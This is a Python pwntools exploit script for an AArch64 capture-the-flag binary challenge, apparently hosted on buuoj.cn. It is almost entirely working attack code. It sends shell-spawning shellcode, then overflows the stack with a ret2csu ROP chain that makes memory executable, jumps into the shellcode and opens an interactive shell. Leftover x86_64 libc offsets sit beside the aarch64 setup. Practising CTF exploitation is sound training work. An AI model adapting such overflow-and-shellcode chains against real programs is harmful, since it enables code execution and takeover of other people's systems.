import sys
from pwn import *
from ctypes import *
context.log_level='debug'
context.arch='aarch64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./pwn')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./pwn')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
		else :
			io=remote('node3.buuoj.cn',26288)
			elf=ELF('./pwn')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]

		
		def csu_rop(call, x0, x1, x2):
			payload = flat(0x4008CC, 0, 0x4008ac, 0, 1, call)
			payload += flat(x2, x1, x0)
			payload += flat(0)
			return payload

		io.recv()
		buf = asm(shellcraft.aarch64.sh())
		buf = buf.ljust(0x100,'\x00')
		buf += p64(0x400600)

		io.sendline(buf)
		pay='a'*72+csu_rop(0x411168,0x411000,0x1000,7)+p64(0x411068)+p64(0xdeadbeef)*6
		io.sendline(pay)







		# libc_base=u64(io.recv(6)+'\x00\x00')-libc.sym['__malloc_hook']-88-0x10
		# libc.address=libc_base
		# system_addr=libc.sym['system']
		# bin_sh_addr=libc.search('/bin/sh\x00').next()
		# success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue